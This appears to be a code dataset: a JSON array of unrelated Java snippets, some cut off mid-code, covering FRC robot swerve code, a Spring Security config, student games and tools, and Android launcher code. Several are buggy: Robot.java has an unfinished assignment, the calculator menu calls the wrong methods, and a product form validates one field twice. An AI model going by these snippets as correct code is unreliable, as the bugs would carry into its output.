turning SPARKS MAX.\n    m_drivingEncoder = m_drivingSparkMax.getEncoder();\n    m_turningEncoder = m_turningSparkMax.getAbsoluteEncoder(Type.kDutyCycle);\n    m_drivingPIDController = m_drivingSparkMax.getPIDController();\n    m_turningPIDController = m_turningSparkMax.getPIDController();\n    m_drivingPIDController.setFeedbackDevice(m_drivingEncoder);\n    m_turningPIDController.setFeedbackDevice(m_turningEncoder);\n\n    // Apply position and velocity conversion factors for the driving encoder. The\n    // native units for position and velocity are rotations and RPM, respectively,\n    // but we want meters and meters per second to use with WPILib's swerve APIs.\n    m_drivingEncoder.setPositionConversionFactor(ModuleConstants.kDrivingEncoderPositionFactor);\n    m_drivingEncoder.setVelocityConversionFactor(ModuleConstants.kDrivingEncoderVelocityFactor);\n\n    // Apply position and velocity conversion factors for the turning encoder. We\n    // want these in radians and radians per second to use with WPILib's swerve\n    // APIs.\n    m_turningEncoder.setPositionConversionFactor(ModuleConstants.kTurningEncoderPositionFactor);\n    m_turningEncoder.setVelocityConversionFactor(ModuleConstants.kTurningEncoderVelocityFactor);\n\n    // Invert the turning encoder, since the output shaft rotates in the opposite direction of\n    // the steering motor in the MAXSwerve Module.\n    m_turningEncoder.setInverted(ModuleConstants.kTurningEncoderInverted);\n\n    // Enable PID wrap around for the turning motor. This will allow the PID\n    // controller to go through 0 to get to the setpoint i.e. going from 350 degrees\n    // to 10 degrees will go through 0 rather than the other direction which is a\n    // longer route.\n    m_turningPIDController.setPositionPIDWrappingEnabled(true);\n    m_turningPIDController.setPositionPIDWrappingMinInput(ModuleConstants.kTurningEncoderPositionPIDMinInput);\n    m_turningPIDController.setPositionPIDWrappingMaxInput(ModuleConstants.kTurningEncoderPositionPIDMaxInput);\n\n    // Set the PID gains for the driving motor. Note these are example gains, and you\n    // may need to tune them for your own robot!\n    m_drivingPIDController.setP(ModuleConstants.kDrivingP);\n    m_drivingPIDController.setI(ModuleConstants.kDrivingI);\n    m_drivingPIDController.setD(ModuleConstants.kDrivingD);\n    m_drivingPIDController.setFF(ModuleConstants.kDrivingFF);\n    m_drivingPIDController.setOutputRange(ModuleConstants.kDrivingMinOutput,\n        ModuleConstants.kDrivingMaxOutput);\n\n    // Set the PID gains for the turning motor. Note these are example gains, and you\n    // may need to tune them for your own robot!\n    m_turningPIDController.setP(ModuleConstants.kTurningP);\n    m_turningPIDController.setI(ModuleConstants.kTurningI);\n    m_turningPIDController.setD(ModuleConstants.kTurningD);\n    m_turningPIDController.setFF(ModuleConstants.kTurningFF);\n    m_turningPIDController.setOutputRange(ModuleConstants.kTurningMinOutput,\n        ModuleConstants.kTurningMaxOutput",
    "package com.example.FiltroFinal.domain.security;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\n\n@EnableWebSecurity\n@Configuration\npublic class WebSecurityConfig {\n    @Autowired\n    JWTAuthorizationFilter jwtAuthorizationFilter;\n\n    @Bean\n    public SecurityFilterChain configure(HttpSecurity http) throws Exception {\n\n        http\n                .csrf(AbstractHttpConfigurer::disable)\n                .authorizeHttpRequests(authz -> authz\n                        .requestMatchers(HttpMethod.POST, Constans.LOGIN_URL, Constans.REGISTER_URL).permitAll()\n                        // Allow Swagger documentation HTML\n                        .requestMatchers(HttpMethod.GET,\n                                \"/doc/**\",\n                                \"/swagger-ui.html\",\n                                \"/swagger-ui/**\",\n                                \"/v3/api-docs/**\",\n                                \"/api/v1/auth/**\",\n                                \"/v2/api-docs\",\n                                \"/v3/api-docs/**\",\n                                \"/swagger-resources\",\n                                \"/swagger-resources/**\",\n                                \"/configuration/ui\",\n                                \"/configuration/security\",\n                                \"/swagger-ui/**\",\n                                \"/webjars/**\",\n                                \"/swagger-ui.html\"\n                        ).permitAll()\n                        .anyRequest().authenticated())\n                .addFilterAfter(jwtAuthorizationFilter, UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n}",
    "/*\n * CEN4025C - Software Engineering 2\n * Programmer: Ava Adams\n * \n * Git Repository: Programming-HORSE\n * Assignment: Capstone project prototype\n * Due Date: April 24, 2024\n * \n * Description:   This file contains the source code for the InitialScreen module.\n */\npackage horse;\nimport java.util.Scanner;\n\npublic class InitialScreen {\n\n    // Attributes\n    private Scanner scanner;    // Scanner object to receive user input\n    private boolean badData;    // Used to validate user input\n    private final int MIN_NAME_LENGTH = 3;  // minimum player name length\n    private final int MAX_NAME_LENGTH = 20;  // maximum player name length\n\n    // Methods\n    /*\n     * Constructor\n     * Displays welcome message\n     */\n    public InitialScreen() {\n        System.out.println(\"\\nWelcome to Programming HORSE!\");\n        System.out.println(\"-------------------------------\");\n    }\n\n    // Get the name of player 1 and validate user input\n    public String getPlayer1Name() {\n        scanner = new Scanner(System.in);\n        badData = true;\n        String p1Name = \"Player1\";\n\n        while (badData) {\n            System.out.print(\"Enter the name of player 1: \");\n            p1Name = scanner.nextLine();\n\n            if (nameIsCorrectLength(p1Name) == false) {\n                badData = true;\n            }\n            else {\n                badData = false;\n            }\n        }\n        return p1Name;\n    }\n\n    // Get the name of player 2 and validate user input\n    public String getPlayer2Name(String p1Name) {\n        scanner = new Scanner(System.in);\n        badData = true;\n        String p2Name = \"Player2\";\n\n        while (badData) {\n            System.out.print(\"Enter the name of player 2: \");\n            p2Name = scanner.nextLine();\n\n            if (nameIsCorrectLength(p2Name) == false) {\n                badData = true;\n            }\n            else if (p1Name.compareTo(p2Name) == 0) {\n                badData = true;\n                System.out.println(\"Invalid entry. Player 1 and 2 cannot have the same name.\");\n            }\n            else {\n                badData = false;\n            }\n        }\n        return p2Name;\n    }\n\n    // Checks if the Player's name is the correct length\n    public boolean nameIsCorrectLength(String pName) {\n        if (pName.length() < MIN_NAME_LENGTH || pName.length() > MAX_NAME_LENGTH) {\n            System.out.println(\"Invalid entry. Player names must be between \" \n                                + MIN_NAME_LENGTH + \" and \" +  MAX_NAME_LENGTH + \" characters long.\");\n            return false;\n        }\n        \n        return true;\n    }\n}\n",
    "// Copyright (c) FIRST and other WPILib contributors.\n// Open Source Software; you can modify and/or share it under the terms of\n// the WPILib BSD license file in the root directory of this project.\n\npackage frc.robot;\n\nimport edu.wpi.first.wpilibj.TimedRobot;\nimport edu.wpi.first.wpilibj2.command.Command;\nimport edu.wpi.first.wpilibj2.command.CommandScheduler;\nimport frc.robot.subsystems.Swerve;\nimport edu.wpi.first.wpilibj.motorcontrol.Talon;\n\n/**\n * The VM is configured to automatically run this class, and to call the functions corresponding to\n * each mode, as described in the TimedRobot documentation. If you change the name of this class or\n * the package after creating this project, you must also update the build.gradle file in the\n * project.\n */\npublic class Robot extends TimedRobot {\n  private Command m_autonomousCommand;\n\n  private RobotContainer m_robotContainer;\n\n  /**\n   * This function is run when the robot is first started up and should be used for any\n   * initialization code.\n   */\n  @Override\n  public void robotInit() {\n    // Instantiate our RobotContainer.  This will perform all our button bindings, and put our\n    // autonomous chooser on the dashboard.\n    m_robotContainer = new RobotContainer();\n    Swerve SwerveModule = \n    }\n\n  /**\n   * This function is called every 20 ms, no matter the mode. Use this for items like diagnostics\n   * that you want ran during disabled, autonomous, teleoperated and test.\n   *\n   * <p>This runs after the mode specific periodic functions, but before LiveWindow and\n   * SmartDashboard integrated updating.\n   */\n  @Override\n  public void robotPeriodic() {\n    // Runs the Scheduler.  This is responsible for polling buttons, adding newly-scheduled\n    // commands, running already-scheduled commands, removing finished or interrupted commands,\n    // and running subsystem periodic() methods.  This must be called from the robot's periodic\n    // block in order for anything in the Command-based framework to work.\n    CommandScheduler.getInstance().run();\n\n  }\n\n  /** This function is called once each time the robot enters Disabled mode. */\n  @Override\n  public void disabledInit() {}\n\n  @Override\n  public void disabledPeriodic() {}\n\n  /** This autonomous runs the autonomous command selected by your {@link RobotContainer} class. */\n  @Override\n  public void autonomousInit() {\n    m_autonomousCommand = m_robotContainer.getAutonomousCommand();\n\n    // schedule the autonomous command (example)\n    if (m_autonomousCommand != null) {\n      m_autonomousCommand.schedule();\n    }\n  }\n\n  /** This function is called periodically during autonomous. */\n  @Override\n  public void autonomousPeriodic() {}\n\n  @Override\n  public void teleopInit() {\n    // This makes sure that the autonomous stops running when\n    // teleop starts running. If you want the autonomous to\n    // continue until interrupted by another command, remove\n    // this line or comment it out.\n    if (m_autonomousCommand != null) {\n      m_autonomousCommand.cancel();\n    }\n  }\n\n  /** This function is called periodically during operator control. */\n  @Override\n  public void teleopPeriodic() {}\n\n  @Override\n  public void testInit() {\n    // Cancels all running commands at the start of test mode.\n    CommandScheduler.getInstance().cancelAll();\n  }\n\n  /** This function is called periodically during test mode. */\n  @Override\n  public void testPeriodic() {}\n\n  /** This function is called once when the robot is first started up. */\n  @Override\n  public void simulationInit() {}\n\n  /** This function is called periodically whilst in simulation. */\n  @Override\n  public void simulationPeriodic() {}\n}\n",
    "package com.example.student.Service;\n\nimport com.example.student.Model.Courses;\nimport com.example.student.Model.Student;\nimport com.example.student.Repository.CoursesRepository;\nimport com.example.student.Repository.StudentRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.server.ResponseStatusException;\n\nimport java.util.List;\n\n@Service\npublic class CoursesServiceImple implements CoursesService{\n    @Autowired\n    private CoursesRepository courseRepo;\n    @Autowired\n    private StudentRepository studentRepository;\n    @Override\n    public List<Courses> findAllCourses() {\n        return courseRepo.findAll();\n    }\n\n    @Override\n    public Courses addCourse(Courses course) {\n        return courseRepo.save(course);\n    }\n\n    @Override\n    public Courses updateCourse(Integer courseId, Courses course) {\n        try{\n            Courses c=courseRepo.findById(courseId).get();\n            if(course.getCourseName()!=null)\n            {\n                c.setCourseName(course.getCourseName());\n            }\n            if(course.getCourseFee()!=0)\n            {\n                c.setCourseFee(course.getCourseFee());\n            }\n            return courseRepo.save(c);\n        }\n        catch(Exception e)\n        {\n            throw new ResponseStatusException(HttpStatus.BAD_REQUEST);\n        }\n    }\n\n    @Override\n    public Courses findCourseById(Integer courseId) {\n\n            Courses c=courseRepo.findById(courseId).orElseThrow(()-> new RuntimeException(\"Provide correct Id\"));\n            return c;\n    }\n\n    @Override\n    public void deleteCourse(Integer courseId) {\n        try{\n            Courses course=courseRepo.findById(courseId).get();\n            List<Student> students=course.getStudents();\n            for(Student s:students)\n            {\n                s.getCourses().remove(course);\n            }\n           studentRepository.saveAll(students);\n            courseRepo.deleteById(courseId);\n        }\n        catch (Exception e)\n        {\n            throw new ResponseStatusException(HttpStatus.BAD_REQUEST,\"Provide Correct Id\");\n        }\n    }\n}\n",
    "import java.awt.*;\nimport java.awt.event.*;\nimport java.awt.image.BufferStrategy;\nimport java.util.ArrayList;\nimport java.util.Random;\nimport javax.swing.*;\n\npublic class Board extends JPanel implements ActionListener, KeyListener {\n\n    public BufferStrategy bufferStrategy;\n\n    public boolean coindisplayed;\n    // controls the delay between each tick in ms\n    private final int DELAY = 25;\n    // controls the size of the board\n    public static final int TILE_SIZE = 50;\n    public static final int ROWS = 12;\n    public static final int COLUMNS = 18;\n    // controls how many coins appear on the board\n    public static final int NUM_COINS = 5;\n    // suppress serialization warning\n    private static final long serialVersionUID = 490905409104883233L;\n    // keep a reference to the timer object that triggers actionPerformed() in\n    // case we need access to it in another method\n    private Timer timer;\n    // objects that appear on the game board\n    private Player player;\n    public Door door;\n    public Introduction introduction;\n    public Background background;\n    public Smithsonian smithsonian;\n    public House house;\n    private ArrayList<Coin> coins;\n    private ArrayList<Biden> bidens;\n    public int level = 0;\n    public int counter = 0;\n    public Image louvre;\n    public Image background2;\n    public Image intro;\n    public Image whitehouse;\n    public ArrayList<Coin> coinList;\n    public ArrayList<Biden> bidenList;\n\n    public Board() {\n        // set the game board size\n        setPreferredSize(new Dimension(933, 733));\n        // set the game board background color\n      \n\n        // initialize the game state\n        introduction = new Introduction(0,0);\n        background = new Background(0,0);\n        smithsonian = new Smithsonian(0,0);\n        door = new Door(700, 300);\n        player = new Player();\n        coins = populateCoins();\n\n        // this timer will call the actionPerformed() method every DELAY ms\n        timer = new Timer(DELAY, this);\n        timer.start();\n    }\n\n    @Override\n    public void actionPerformed(ActionEvent e) {\n        // this method is called by the timer every DELAY ms.\n        // use this space to update the state of your game or animation\n        // before the graphics are redrawn.\n\n        // prevent the player from disappearing off the board\n        player.tick();\n\n        // give the player points for collecting coins\n        collectCoins();\n\n        repaint();\n    }\n\n    public void paintComponent(Graphics g) {\n\n        super.paintComponent(g);\n        // when calling g.drawImage() we can use \"this\" for the ImageObserver \n        // because Component implements the ImageObserver interface, and JPanel \n        // extends from Component. So \"this\" Board instance, as a Component, can \n        // react to imageUpdate() events triggered by g.drawImage()\n        if (level == 0){\n            introduction.draw(g,this);\n        }\n        \n        if (level == 1){\n            background.draw(g,this);\n    \n            for (Coin coin : coins) {\n            // System.out.println(\"drawing coin!\");\n            coin.draw(g, this);\n            }\n            \n            door.draw(g, this);\n            player.draw(g, this);\n        }\n        if (level == 2){\n            smithsonian.draw(g,this);\n            for (Coin coin : coins) {\n                System.out.println(\"drawing coin!\");\n                coin.draw(g, this);\n            }\n           \n            door.draw(g, this);\n            player.draw(g, this);\n        }\n\n        if (level == 3){\n            house.draw(g,this);\n            for (Biden biden: bidens){\n                biden.draw(g,this);\n            }\n        }\n       // drawScore(g);\n\n        // this smooths out animations on some systems\n        Toolkit.getDefaultToolkit().sync();\n    }\n\n    private ArrayList<Coin> populateCoins() {\n        coinList = new ArrayList<>();\n        Random rand = new Random();\n\n        // create the given number of coins in random positions on the board.\n        // note that there is not check here to prevent two coins from occupying the same\n        // spot, nor to prevent coins from spawning in the same spot as the player\n        for (int i = 0; i < NUM_COINS; i++) {\n            int coinX = rand.nextInt(18);\n            int coinY = rand.nextInt(15);\n            coinList.add(new Coin(coinX, coinY));\n        }\n\n        return coinList;\n    }\n\n    private ArrayList<Biden> populateBidens() {\n        bidenList = new ArrayList<>();\n        Random rand = new Random();\n\n        // create the given number of coins in random positions on the board.\n        // note that there is not check here to prevent two coins from occupying the same\n        // spot, nor to prevent coins from spawning in the same spot as the player\n        for (int i = 0; i < 6; i++) {\n            int bidenX = rand.nextInt(18);\n            int bidenY = rand.nextInt(15);\n            bidenList.add(new Biden(bidenX, bidenY));\n        }\n\n        return bidenList;\n    }\n\n ",
    "import java.util.*;\r\n\r\nclass BookReview {\r\n    int rating;\r\n\r\n    public BookReview(int rating) {\r\n        this.rating = rating;\r\n    }\r\n}\r\n\r\nclass ReviewStats {\r\n    int totalBooks;\r\n    int[] ratingRangeCounts;\r\n    int positiveCount;\r\n    int neutralCount;\r\n    int negativeCount;\r\n\r\n    public ReviewStats() {\r\n        this.totalBooks = 0;\r\n        this.ratingRangeCounts = new int[2]; // Assuming 2 rating ranges: 1-5 stars and 6-10 stars\r\n        this.positiveCount = 0;\r\n        this.neutralCount = 0;\r\n        this.negativeCount = 0;\r\n    }\r\n\r\n    public void updateStats(int rating) {\r\n        totalBooks++;\r\n\r\n        if (rating >= 1 && rating <= 5) {\r\n            ratingRangeCounts[0]++;\r\n        } else if (rating >= 6 && rating <= 10) {\r\n            ratingRangeCounts[1]++;\r\n        }\r\n\r\n        if (rating >= 7 && rating <= 10) {\r\n            positiveCount++;\r\n        } else if (rating >= 4 && rating <= 6) {\r\n            neutralCount++;\r\n        } else if (rating >= 1 && rating <= 3) {\r\n            negativeCount++;\r\n        }\r\n    }\r\n}\r\n\r\npublic class BookReviewAnalyzer {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n        List<BookReview> reviews = new ArrayList<>();\r\n\r\n        System.out.println(\"Enter the number of book reviews:\");\r\n        int numReviews = scanner.nextInt();\r\n        scanner.nextLine(); // Consume newline character\r\n\r\n        for (int i = 0; i < numReviews; i++) {\r\n            System.out.println(\"Enter book rating:\");\r\n            int rating = scanner.nextInt();\r\n            scanner.nextLine(); // Consume newline character\r\n\r\n            reviews.add(new BookReview(rating));\r\n        }\r\n\r\n        ReviewStats stats = new ReviewStats();\r\n\r\n        for (BookReview review : reviews) {\r\n            stats.updateStats(review.rating);\r\n        }\r\n\r\n        System.out.println(\"\\nBook Review Statistics:\");\r\n        System.out.println(\"Total Books Reviewed: \" + stats.totalBooks);\r\n        System.out.println(\"Books Reviewed in 1-5 Stars Range: \" + stats.ratingRangeCounts[0]);\r\n        System.out.println(\"Books Reviewed in 6-10 Stars Range: \" + stats.ratingRangeCounts[1]);\r\n        System.out.println(\"Positive Reviews Count: \" + stats.positiveCount);\r\n        System.out.println(\"Neutral Reviews Count: \" + stats.neutralCount);\r\n        System.out.println(\"Negative Reviews Count: \" + stats.negativeCount);\r\n    }\r\n}\r\n```\r\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\nimport java.io.*;\n\npublic class RandProductMaker extends JFrame implements ActionListener\n    {\n        private JTextField productIdField, nameField, desField, costField, recordCountField;\n        private JButton addButton;\n        private FileWriter fileWriter;\n        private int recordCount;\n\n        public RandProductMaker()\n            {\n                setTitle(\"Random Product Maker\");\n                setSize(600, 350);\n                setLocationRelativeTo(null);\n                setDefaultCloseOperation(EXIT_ON_CLOSE);\n\n                JPanel panel = new JPanel(new GridLayout(6, 2, 5, 5));\n\n                panel.add(new JLabel(\"Product ID:\"));\n                productIdField = new JTextField();\n                panel.add(productIdField);\n\n                panel.add(new JLabel(\"Product Name:\"));\n                nameField = new JTextField();\n                panel.add(nameField);\n\n                panel.add(new JLabel(\"Short description:\"));\n                desField = new JTextField();\n                panel.add(desField);\n\n                panel.add(new JLabel(\"Cost:\"));\n                costField = new JTextField();\n                panel.add(costField);\n\n                panel.add(new JLabel(\"Record Count:\"));\n                recordCountField = new JTextField();\n                recordCountField.setEditable(false);\n                panel.add(recordCountField);\n\n                addButton = new JButton(\"Add\");\n                addButton.addActionListener(this);\n                panel.add(addButton);\n\n                add(panel);\n            }\n\n            public void actionPerformed(ActionEvent e)\n            {\n                if (e.getSource() == addButton)\n                    {\n                        if (validateFields())\n                            {\n                                writeRecord();\n                                clearFields();\n                                updateRecordCount();\n                            }\n                        else\n                            {\n                                JOptionPane.showMessageDialog(this, \"Double Check data\", \"Error\", JOptionPane.ERROR_MESSAGE);\n                            }\n                    }\n            }\n\n            private boolean validateFields()\n                {\n                    String productId = productIdField.getText().trim();\n                    String name = nameField.getText().trim();\n                    String price = costField.getText().trim();\n                    String quantity = costField.getText().trim();\n\n                    return !productId.isEmpty() && !name.isEmpty() && isDouble(price) && isInteger(quantity);\n                }\n\n            private boolean isDouble(String s)\n                {\n                    try\n                        {\n                            Double.parseDouble(s);\n                            return true;\n                        }\n                    catch (NumberFormatException e)\n                        {\n                            return false;\n                        }\n                }\n\n            private boolean isInteger(String s)\n                {\n                    try\n                        {\n                            Integer.parseInt(s);\n                            return true;\n                        }\n                    catch (NumberFormatException e)\n                        {\n                            return false;\n                        }\n                }\n\n            private void writeRecord()\n                {\n                    try\n                        {\n                            fileWriter = new FileWriter(\"products.txt\", true); // Append mode\n                            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);\n\n                            StringBuilder record = new StringBuilder();\n                            record.append(padField(productIdField.getText(), 6)).append(\"|\");\n                            record.append(padField(nameField.getText(), 35)).append(\"|\");\n                            record.append(padField(desField.getText(), 75)).append(\"|\");\n                            record.append(costField.getText());\n\n                            bufferedWriter.write(record.toString());\n                            bufferedWriter.newLine();\n\n                            bufferedWriter.close();\n                            fileWriter.close();\n                        }\n                    catch (IOException e)\n                        {\n                            e.printStackTrace();\n                        }\n                }\n\n            private String padField(String field, int length)\n                {\n                    if (field.length() < length)\n                        {\n                            StringBuilder paddedField = new StringBuilder(field);\n                            while (paddedField.length() < length)\n                                {\n                         ",
    "package case1;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Metodos {\r\n\r\n    Scanner sc = new Scanner(System.in);\r\n    int opcion = 0;\r\n\r\n    void ciclo() {\r\n        do {\r\n            System.out.println(\"Menu\");\r\n            System.out.println(\"1. suma\");\r\n            System.out.println(\"2. Resta\");\r\n            System.out.println(\"3. Multiplicacion\");\r\n            System.out.println(\"4. Division\");\r\n            System.out.println(\"5. Salir\");\r\n            Scanner sc = new Scanner(System.in);\r\n            opcion = sc.nextInt();\r\n            switch (opcion) {\r\n                case 1:\r\n                    cal();\r\n                    break;\r\n                case 2:\r\n                    suma();\r\n                    break;\r\n                case 3:\r\n                    multi();\r\n                    break;\r\n                case 4:\r\n                    division();\r\n                    break;\r\n                case 5:\r\n                    System.out.println(\"Saliendo.....\");\r\n                    break;\r\n\r\n                default:\r\n                    System.out.println(\"Dato invalido\");\r\n                    break;\r\n            }\r\n        } while (opcion != 5);\r\n    }\r\n\r\n    int nume1, nume2;\r\n    int result;\r\n    Scanner op = new Scanner(System.in);\r\n\r\n    void cal() {\r\n        System.out.println(\"ingrese el primer valor\");\r\n        nume1 = op.nextInt();\r\n        System.out.println(\"ingrese el segundo valor\");\r\n        nume2 = op.nextInt();\r\n    }\r\n\r\n    void suma() {\r\n        result = nume1 + nume2;\r\n        System.out.println(\"Resultado es: \" + result);\r\n    }\r\n\r\n    void resta() {\r\n        result = nume1 - nume2;\r\n        System.out.println(\"Resultado es: \" + result);\r\n    }\r\n\r\n    void multi() {\r\n        result = nume1 * nume2;\r\n        System.out.println(\"Resultado es: \" + result);\r\n    }\r\n\r\n    void division() {\r\n        result = nume1 / nume2;\r\n        System.out.println(\"Resultado es: \" + result);\r\n    }\r\n}\r\n",
    "package com.example.BookService.entity;\n\nimport javax.persistence.Entity;\nimport javax.persistence.GeneratedValue;\nimport javax.persistence.GenerationType;\nimport javax.persistence.Id;\n\n@Entity\npublic class Book {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    private String title;\n    private String author;\n    private double price;\n\n    public Book() {\n        // Default constructor required by JPA\n    }\n\n    public Book(String title, String author, double price) {\n        this.title = title;\n        this.author = author;\n        this.price = price;\n    }\n\n    // Getters and Setters for all fields\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getAuthor() {\n        return author;\n    }\n\n    public void setAuthor(String author) {\n        this.author = author;\n    }\n\n    public double getPrice() {\n        return price;\n    }\n\n    public void setPrice(double price) {\n        this.price = price;\n    }\n}\n",
    "package com.ramadhani.multiactivity1;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.widget.Button;\nimport android.widget.TextView;\nimport android.view.View;\n\npublic class MainActivity1 extends AppCompatActivity {\n     int skorA = 0;\n     int skorB = 0;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main1);\n\n        updateScore();\n    }\n\n    public void satupointA(View view) {\n        skorA++;\n        updateScore();\n    }\n    public void satuPointB(View view) {\n        skorB++;\n        updateScore();\n    }\n    public void duapointA(View view) {\n        skorA += 2;\n        updateScore();\n    }\n    public void duapointB(View view) {\n        skorB += 2;\n        updateScore();\n    }\n    public void tigapointA(View view) {\n        skorA += 3;\n        updateScore();\n    }\n    public void tigapointB(View view) {\n        skorB += 3;\n        updateScore();\n    }\n    public void resetScore(View view){\n        skorA = 0;\n        skorB = 0;\n        updateScore();\n    }\n\n    private void updateScore() {\n        TextView scoreViewA = findViewById(R.id.score_team_a);\n        TextView scoreViewB = findViewById(R.id.score_team_b);\n        scoreViewA.setText(String.valueOf(skorA));\n        scoreViewB.setText(String.valueOf(skorB));\n    }\n\n    public void pindah0(View view){\n        Intent intent = new Intent(MainActivity1.this,MainActivity.class);\n        startActivity(intent);\n    }\n    public void pindah2(View view){\n        Intent intent = new Intent(MainActivity1.this,MainActivity2.class);\n        startActivity(intent);\n    }\n    public void pindah3(View view){\n        Intent intent = new Intent(MainActivity1.this,MainActivity3.class);\n        startActivity(intent);\n    }\n    public void pindah4(View view){\n        Intent intent = new Intent(MainActivity1.this,MainActivity4.class);\n        startActivity(intent);\n    }\n}",
    "/*\n * Copyright (C) 2021 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.android.quickstep.inputconsumers;\n\nimport static android.view.MotionEvent.INVALID_POINTER_ID;\n\nimport static com.android.launcher3.MotionEventsUtils.isTrackpadMotionEvent;\nimport static com.android.launcher3.Utilities.squaredHypot;\nimport static com.android.launcher3.config.FeatureFlags.ENABLE_CURSOR_HOVER_STATES;\nimport static com.android.launcher3.taskbar.TaskbarAutohideSuspendController.FLAG_AUTOHIDE_SUSPEND_TOUCHING;\n\nimport android.content.Context;\nimport android.content.res.Resources;\nimport android.graphics.PointF;\nimport android.graphics.Rect;\nimport android.view.GestureDetector;\nimport android.view.GestureDetector.SimpleOnGestureListener;\nimport android.view.InputDevice;\nimport android.view.MotionEvent;\n\nimport androidx.annotation.Nullable;\n\nimport com.android.launcher3.DeviceProfile;\nimport com.android.launcher3.R;\nimport com.android.launcher3.Utilities;\nimport com.android.launcher3.taskbar.TaskbarActivityContext;\nimport com.android.launcher3.taskbar.TaskbarThresholdUtils;\nimport com.android.launcher3.taskbar.TaskbarTranslationController.TransitionCallback;\nimport com.android.launcher3.taskbar.bubbles.BubbleControllers;\nimport com.android.launcher3.touch.OverScroll;\nimport com.android.launcher3.util.DisplayController;\nimport com.android.quickstep.InputConsumer;\nimport com.android.quickstep.OverviewCommandHelper;\nimport com.android.systemui.shared.system.InputMonitorCompat;\n\n/**\n * Listens for touch and hover events to unstash the Taskbar.\n *\n * <p>Cancels the current gesture if the long press causes the Taskbar to be unstashed.\n */\npublic class TaskbarUnstashInputConsumer extends DelegateInputConsumer {\n\n    private final TaskbarActivityContext mTaskbarActivityContext;\n    private final OverviewCommandHelper mOverviewCommandHelper;\n    private final GestureDetector mLongPressDetector;\n    private final float mSquaredTouchSlop;\n\n    private float mLongPressDownX, mLongPressDownY;\n    private boolean mCanceledUnstashHint;\n    private final float mUnstashArea;\n    private final float mScreenWidth;\n\n    private final int mTaskbarNavThreshold;\n    private final int mTaskbarNavThresholdY;\n    private final boolean mIsTaskbarAllAppsOpen;\n    private boolean mHasPassedTaskbarNavThreshold;\n    private boolean mIsInBubbleBarArea;\n\n    private final PointF mDownPos = new PointF();\n    private final PointF mLastPos = new PointF();\n    private int mActivePointerId = INVALID_POINTER_ID;\n\n    private final boolean mIsTransientTaskbar;\n\n    private boolean mIsStashedTaskbarHovered = false;\n    private final Rect mStashedTaskbarHandleBounds = new Rect();\n    private final Rect mBottomEdgeBounds = new Rect();\n    private final int mBottomScreenEdge;\n    private final int mStashedTaskbarBottomEdge;\n\n    private final @Nullable TransitionCallback mTransitionCallback;\n\n    public TaskbarUnstashInputConsumer(Context context, InputConsumer delegate,\n            InputMonitorCompat inputMonitor, TaskbarActivityContext taskbarActivityContext,\n            OverviewCommandHelper overviewCommandHelper) {\n        super(delegate, inputMonitor);\n        mTaskbarActivityContext = taskbarActivityContext;\n        mOverviewCommandHelper = overviewCommandHelper;\n        // TODO(b/270395798): remove this when cleaning up old Persistent Taskbar code.\n        mSquaredTouchSlop = Utilities.squaredTouchSlop(context);\n        mScreenWidth = taskbarActivityContext.getDeviceProfile().widthPx;\n\n        Resources res = context.getResources();\n        mUnstashArea = res.getDimensionPixelSize(R.dimen.taskbar_unstash_input_area);\n        mTaskbarNavThreshold = TaskbarThresholdUtils.getFromNavThreshold(res,\n                taskbarActivityContext.getDeviceProfile());\n        mTaskbarNavThresholdY = taskbarActivityContext.getDeviceProfile().heightPx\n                - mTaskbarNavThreshold;\n        mIsTaskbarAllAppsOpen =\n                mTaskbarActivityContext != null && mTaskbarActivityContext.isTaskbarAllAppsOpen();\n\n        mIsTransientTaskbar = DisplayController.isTransientTaskbar(context);\n\n        mLongPressDetector = new GestureDetector(context, new SimpleOnGestureListener() {\n            @Override\n            public void onLongPress(MotionEvent motionEvent) {\n                onLongPressDetected(motionEvent);\n            }\n        });\n\n        mBottomScreenEdge = res.getDimensionPixelSize(\n                R.dimen.taskbar_sta",
